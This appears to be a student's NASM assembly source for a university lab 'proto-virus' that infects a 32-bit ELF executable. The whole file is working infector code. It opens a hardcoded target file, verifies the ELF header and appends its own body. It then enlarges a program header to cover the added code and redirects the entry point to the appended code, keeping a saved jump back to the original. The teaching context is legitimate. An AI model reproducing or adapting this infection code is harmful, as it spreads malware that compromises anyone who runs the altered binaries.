%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define STDOUT 1
%define STDERR 2

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	

global _start

section .text

_start:	
	push ebp
	mov	ebp, esp						
	sub	esp, STK_RES            			 ; Set up ebp and reserve space on the stack for local storage
											 ; fd =[ebp-(4-0)],n = [ebp-(8-4)], elf_header = [ebp-(60-8)]
											 ; ph = [ebp-(92-61)]
	call get_my_loc
	sub esi, next_i-OutStr
	write STDOUT, esi, 31

	call get_my_loc
	sub esi, next_i-FileName
	open esi, RDWR, 0x644
	
	cmp eax, 0								  ; verify fd >= 0
	jl Error

	mov [ebp-4], eax						  ; save returned fd

	LoadingElfHeader:
		mov ecx,ebp
		sub ecx, 60
		read dword[ebp-4], ecx, 52

	VerifyIsElf:
		mov eax, 0							  ; verify 'E' 'L' 'F'
		mov al, [ebp-59]
		cmp eax, 69
		jnz Error
		mov al, [ebp-58]
		cmp eax, 76
		jnz Error
		mov al, [ebp-57]
		cmp eax, 70
		jnz Error

	SavingFileSize:
		lseek [ebp-4],0,SEEK_SET
		lseek [ebp-4],0,SEEK_END
		mov [ebp-8],eax				

	AddingVirusToExec:
		lseek [ebp-4],0,SEEK_END
		mov ebx,eax

		mov edx,virus_end					  ; get virus size
		sub edx,_start

		call get_my_loc
		sub esi,next_i-_start				  ; get virus relative address

		add eax,esi
		
		write [ebp-4],esi,edx				  ; write the virus in file
		cmp eax, 0							  ; verify no error in writing
		jl Error

	ChangingPrevEP:
		mov esi, ebp						  ; get previous entry point
		sub esi, 60
		add esi, 24

		lseek [ebp-4],-4,SEEK_END
		write [ebp-4],esi,4
		cmp eax, 0							  ; verify no error in writing
		jl Error
		
	LoadingSecondProgramHeader:
		lseek [ebp-4],0,SEEK_SET

		mov esi,[ebp-60+28]					  ; get e_phoff
		mov ebx,0 
		mov bx,[ebp-60+42]					  ; get e_phentsize (32)
		add esi,ebx							  ; eax = ph offset
		
		lseek [ebp-4],esi,SEEK_SET

		mov esi,ebp
		sub esi, 92
		read dword[ebp-4], esi, 32			  ; loading secong ph to [ebp-92]	  
		cmp eax, 0							  ; verify no error in writing
		jl Error

	ModifingSecondPH:
		mov ecx,[ebp-92+4]					  ; p_offset

		mov edx,virus_end					  ; get virus size
		sub edx,_start

		add edx,[ebp-8]						  ; edx = size of file
		sub edx,ecx							  ; edx = size of file + virus code size - p_offset
											 
		mov [ebp-92+16],edx					  ; FileSiz
		mov [ebp-92+20],edx					  ; MemSiz

	SavingModifiedPH:
		mov esi,[ebp-60+28]					  ; get e_phoff
		mov ebx,0 
		mov bx,[ebp-60+42]					  ; get e_phentsize (32)
		add esi,ebx							  ; eax = ph offset 

		lseek [ebp-4],esi,SEEK_SET
		mov esi,ebp
		sub esi,92
		write dword[ebp-4],	esi,32
		cmp eax, 0							  ; verify no error in writing
		jl Error

	ChangingEntryPoint:
		mov esi,[ebp-60+28]					  ; get e_phoff
		add esi,8							  ; + p_vaddr
		
		lseek [ebp-4],esi,SEEK_SET
		
		mov esi,ebp
		sub esi,96
		read dword[ebp-4],esi,4
		cmp eax, 0							  ; verify no error in writing
		jl Error

		lseek [ebp-4],0,SEEK_SET

		mov edx, [ebp-96]				      ; file start 
		add edx, [ebp-8]				      ; file size
		add edx, 0x1000						  ; align

		mov dword[ebp-60+ENTRY], edx		  ; 24 - entry_point offset

		mov ecx,ebp
		sub ecx,60
		write dword[ebp-4],	ecx,52
		
		cmp eax, 0							  ; verify no error in writing
		jl Error

	call get_my_loc
	sub esi, next_i-EndMessage
	write STDOUT, esi, 10

	mov esp,ebp
	pop ebp

	call get_my_loc
	sub esi, next_i-PreviousEntryPoint
	jmp [esi]
VirusExit:
       exit 0                                 ; Termination if all is OK and no previous code to jump to
                                              ; (also an example for use of above macros)
Error:
	call get_my_loc
	sub esi, next_i-Failstr
	write STDERR, esi, 12
	exit 1

FileName:	db "ELFexec2long", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
StartMessage: db "This is a virus",10,0
EndMessage: db "No error",10,0
ErrorMessage: db "Error had occured",10,0
	
get_my_loc:
	call next_i
next_i:
	pop esi
	ret

PreviousEntryPoint: dd VirusExit
virus_end:




